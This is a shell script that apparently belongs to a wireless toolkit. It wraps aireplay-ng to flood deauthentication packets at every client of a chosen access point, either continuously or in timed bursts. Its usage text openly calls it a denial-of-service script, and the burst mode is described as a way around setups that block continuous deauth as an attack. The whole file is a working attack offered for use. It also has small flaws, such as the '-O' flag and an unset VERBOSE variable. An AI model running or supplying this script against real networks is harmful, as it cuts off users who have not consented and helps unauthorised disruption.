#!/bin/sh

if [ $# -lt 2 ]; then
	echo "Usage: $0 <AP BSSID> <channel> [incremental sleep time]"
	echo "This application is really a denial-of-service / deauth all script so be careful with it.  This will send deauth packets continuously to all attached clients until stopped."

	echo "<AP BSSID>   AP's mac address.  Can be discovered through wireless.display_aps.sh"
	echo "             in the top section."
	echo "<channel>	   Wireless channel to set the card to."
	echo "[incremental] If specified, rather than continuous mode, 6 deauths are sent, then the script sleeps for the specified period of time and repeats.  In some environments if the continous deauth is blocked as an attack, or interferes with other wireless activities, this type of setup may be necessary."
	echo " "
	exit 1
fi

APMAC=$1
WIRELESSCHANNEL=$2

if [ $# -gt 2 ]; then
	SLEEPTIME=$3
else
	SLEEPTIME=0
fi

# MONINTERFACE=`iwconfig 2> /dev/null | grep  -B 1 "Mode:Monitor" | grep -Eio --max-count=1 "^.*?IEEE" | sed "s|\sIEEE||" | sed "s|\s||"`
MONINTERFACE=`iwconfig 2> /dev/null | grep  -B 1 "Mode:Monitor" | grep -Eio "^[a-z,A-Z,0-9]{3,7}" | sed "s|\sIEEE||" | sed "s|\s||"`

if [ ${#MONINTERFACE} -gt 0 ]; then
	iwconfig $MONINTERFACE channel $WIRELESSCHANNEL

	if [ $SLEEPTIME -eq 0 ]; then
		aireplay-ng -O 0 -D -a $APMAC $MONINTERFACE
	else
		while true
		do
			aireplay-ng -O 6 -D -a $APMAC $MONINTERFACE
			sleep $SLEEPTIME
		done
	fi
else
	if [ $VERBOSE -eq 1 ]; then
		echo "ERROR: No monitoring interface configured."
	fi
fi

